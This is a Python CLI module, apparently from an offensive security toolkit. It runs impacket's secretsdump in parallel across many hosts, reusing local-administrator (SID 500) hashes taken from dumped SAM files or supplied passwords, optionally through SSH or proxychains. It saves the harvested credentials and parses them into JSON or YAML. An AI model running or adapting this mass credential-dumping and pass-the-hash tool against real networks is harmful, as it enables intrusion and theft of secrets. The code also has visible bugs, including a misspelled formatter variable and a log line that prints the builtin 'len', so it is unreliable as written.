from pathlib import Path
import itertools
import pprint

import click

from .. import logging
from ..toolz import *
from .. import yaml
from .. import ntlm, secretsdump, logging, shell, parallel
from . import common

log = new_log(__name__)

@click.command()
@common.impacket_input_options
@click.option(
    '-o', '--output-dir', type=click.Path(
        resolve_path=True,
    ), default='.',
    help=('Output directory path (default: ".")'),
)
@common.impacket_cred_options
@common.ssh_options
@click.option(
    '--max-workers', type=int, default=5,
    help=(
        'Number of parallel worker threads (default=5)'
    ),
)
@click.option(
    '--echo', is_flag=True,
    help=(
        'Echo the content of the individual commands for debugging purposes'
    ),
)
@click.option(
    '--proxychains', is_flag=True,
    help='''
    Use proxychains for the secretsdump command
    ''',
)
@click.option(
    '--loglevel', default='info',
    help=('Log output level (default: info)'),
)
def dump(ippath, target, sam_path, output_dir, username, password, 
         domain, hashes, ssh, max_workers, echo, proxychains, loglevel):
    logging.setup_logging(loglevel)
    
    echo = (echo or loglevel == 'debug')

    creds = []

    ips = []
    if ippath:
        log.info(f'Reading IPs from path: {ippath}')
        ips = get_ips_from_file(ippath)
    elif target:
        log.info(f'Using target IP: {target}')
        ips = ip_to_seq(target)

    if sam_path:
        creds = pipe(
            ntlm.parse_ip_and_sam_from_path(sam_path),
            # only want local admin (sid 500 users)
            vfilter(lambda ip, d: d['sid'] == '500'),
            vmap(lambda ip, d: (ip, dissoc(d, 'sid'))),
            vmap(lambda ip, d: merge(d, {'ip': ip})),
            tuple,
        )
        if ips:
            creds = pipe(
                itertools.product(
                    ips, creds,
                ),
                vmap(lambda ip, cred: merge(
                    cred, {'ip': ip}
                )),
                tuple,
            )
        missing_ips = pipe(
            creds,
            do(print),
            filter(lambda d: not d.get('ip')),
            tuple,
        )
        if missing_ips:
            log.error(
                f'{len} credentials are missing IP addresses'
                f' (e.g. {missing_ips[0]})'
            )
            creds = pipe(
                creds,
                filter(get('ip')),
                tuple,
            )

    if ips and username and (password or proxychains):
        creds = pipe(
            itertools.product(ips, (username,), (password,)),
            vmap(lambda ip, u, p: merge(
                {
                    'user': u,
                    'ip': ip,
                }, 
                {'domain': domain} if domain else {},
                {'password': p} if not proxychains else {},
            )),
            cconcat(creds),
            tuple,
        )

    if not creds:
        raise click.UsageError(
            'No valid credential information given, provide'
            ' -i/--ippath -t/--target -s/--sam-path and, if necessary,'
            ' -u/--username -p/--password -d/--domain'
        )

    pipe(
        creds,
        map(lambda d: (
            f"{(d.get('domain') + '/') if 'domain' in d else ''}"
            f"{d['user']}:{d.get('password') or d.get('hashes')}"
            f"@{d['ip']}"
        )),
        map(lambda s: f" - {s}"),
        '\n'.join,
        lambda creds_str: log.debug(
            f'Running with the following credential info:\n{creds_str}'
        ),
    )

    output_dir_path = Path(output_dir).expanduser()
    output_dir_path.mkdir(exist_ok=True, parents=True)
    def output_path(cred: dict):
        pw_hash = pipe(
            cred.get('password') or cred.get('hashes') or '',
            md5,
        )
        domain_str = f"-{cred['domain']}" if 'domain' in cred else ''
        return (
            output_dir_path / 
            f"secretsdump-{cred['ip']}{domain_str}-{cred['user']}-{pw_hash}.txt"
        )

    output_done_dir_path = output_dir_path / '.done'
    output_done_dir_path.mkdir(exist_ok=True, parents=True)
    def done_path(cred: dict):
        return (
            output_done_dir_path / output_path(cred).name
        )

    getoutput = shell.getoutput(echo=echo)
    if ssh:
        getoutput = common.ssh_getoutput(ssh, echo=echo)

    pmap = parallel.thread_map(max_workers=max_workers)

    creds_exist = pipe(
        creds,
        map(lambda c: (done_path(c).exists(), c)),
        groupby(first),
        valmap(map_t(second)),
        cmerge({True: [], False: []}),
    )
    if creds_exist[True]:
        log.info(
            f'Skipping {len(creds_exist[True])} hosts'
        )

    def do_dump(cred: dict):
        path = output_path(cred)
        output = secretsdump.secretsdump(getoutput=getoutput, **merge(
            cred, {'outputfile': str(path.parent / path.stem)}
        ), proxychains=proxychains)
        return (
            cred, output
        )

    def output_content(cred: dict, output: str):
        path = output_path(cred)
        bytes_written = path.write_text(output)
        done_path(cred).write_text('')
        return bytes_written

    pipe(
        creds_exist[False],
        pmap(do_dump),
        vmap(output_content),
        tuple,
        lambda written: log.info(
            f'{sum(written)} bytes in {len(written)} files written'
        ),
    )


@click.command()
@click.argument(
    'secretsdump-files', nargs=-1,
)
@click.option(
    '-o', '--output-path', type=click.Path(
        resolve_path=True,
    ), 
    help=('Path to output data'),
)
@click.option(
    '-f', '--format', type=click.Choice(
        ['json', 'yaml']
    ), default='json', show_default=True, help='''
    Output format
    ''', 
)
@click.option(
    '--max-workers', type=int, default=5, show_default=True,
    help=(
        'Number of parallel worker threads'
    ),
)
@click.option(
    '--loglevel', default='info', show_default=True,
    help=('Log output level'),
)
def parse(secretsdump_files, output_path, format, max_workers, loglevel):
    logging.setup_logging(loglevel)

    dump_paths = pipe(
        secretsdump_files,
        map(Path),
        tuple,
    )
    
    log.info(
        f'Parsing {len(dump_paths)} secretsdump files...'
    )

    match format:
        case 'json':
            fomatter = json_dumps
        case 'yaml':
            formatter = yaml.dump

    outputter = print
    if output_path:
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        outputter = output_path.write_text

    pmap = parallel.thread_map(max_workers=max_workers)

    dumps = pipe(
        dump_paths,
        pmap(secretsdump.parse_dump),
        map(outputter),
        tuple,
    )


